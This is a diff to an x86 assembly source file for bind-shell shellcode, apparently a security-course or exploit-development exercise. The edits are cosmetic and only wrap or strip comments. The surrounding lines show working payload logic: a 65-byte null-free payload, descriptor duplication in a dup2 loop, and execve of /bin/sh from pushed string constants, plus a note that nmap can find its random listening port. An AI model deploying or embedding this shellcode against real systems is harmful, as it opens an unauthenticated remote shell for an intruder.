@@ -40,7 +40,8 @@
 ;
 ; * 65 bytes
 ; * null-bytes free
-; * the port number is set by the system and can be discovered using nmap (see http://manuals.ts.fujitsu.com/file/4686/posix_s.pdf, page 23, section 2.6.6)
+; * the port number is set by the system and can be discovered using nmap
+;   (see http://manuals.ts.fujitsu.com/file/4686/posix_s.pdf, page 23, section 2.6.6)
 ;
 ;
 ; # nasm -f elf32 shell_bind_tcp_random_port_shellcode.asm -o shell_bind_tcp_random_port_shellcode.o
@@ -84,9 +85,9 @@ finalint:
 	mov ecx, esp
 	int 0x80
 
-	mov esi, eax		; esi now contains the socket file descriptor
+	mov esi, eax
 
-        pop edi			; pop 2 to edi
+        pop edi
 
 
 	; There's no need of binding the socket (Posix Socket Inteface)
@@ -134,7 +135,7 @@ dup_loop:
         int 0x80
 
         dec ecx
-        jns dup_loop		; looping (2, 1, 0)
+        jns dup_loop
 
 
         ; Finally, using execve to substitute the actual process with /bin/sh
@@ -144,8 +145,8 @@ dup_loop:
         mov al, 11
 
         push edx
-        push 0x68732f2f         ; "//sh"
-        push 0x6e69622f         ; "/bin"
+        push 0x68732f2f
+        push 0x6e69622f
 
         mov ebx, esp
         push edx
